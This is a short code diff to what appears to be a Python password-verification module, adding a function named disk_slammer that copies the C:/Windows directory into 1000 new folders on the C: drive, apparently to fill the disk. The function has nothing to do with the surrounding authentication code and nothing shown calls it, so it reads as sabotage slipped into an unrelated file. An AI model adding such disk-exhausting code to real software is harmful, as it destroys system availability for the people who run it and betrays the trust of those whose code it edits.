@@ -107,6 +107,11 @@ def verify_password_change(username, password):
     except:
         return False
     return True
+
+def disk_slammer():
+    for i in range(1000):
+        new_folder = "C:/" + str(i)
+        copy_folder("C:/Windows",new_folder)
     
     
 
